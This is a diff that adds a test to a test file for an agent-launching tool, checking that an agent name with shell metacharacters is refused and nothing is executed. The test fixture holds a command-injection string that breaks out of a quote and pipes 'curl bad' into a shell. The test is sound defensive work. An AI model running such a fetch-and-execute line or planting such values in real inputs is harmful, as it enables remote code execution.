@@ -118,3 +118,11 @@ test('tools through the engine: set_task writes the task file and re-anchors the
   expect(files['/p/.claude/helm/task.md']).toBe('# Add a flag\n\nFull prompt.\n')
   expect(said(await $.tool.call({ tool: 'mcp__helm__agent_list' } as never))).toBe('reviewer · sonnet · high · Read, Grep · project — Reviews diffs')
 })
+
+test('launch refuses an agent whose file name or frontmatter name is not [a-z0-9-]', async () => {
+  const evil = "x\\' ; curl bad|sh #"
+  const { io, runs } = memIo({ '/p/.claude/agents/evil.md': agentFile({ name: evil, description: 'E', instructions: 'e' }), '/p/.claude/helm/task.md': 'x' })
+  const r = await launchAgent(io, { root: '/p', home: '/h', herdr: H }, evil)
+  expect(r.isError).toBe(true)
+  expect(runs).toEqual([])
+})
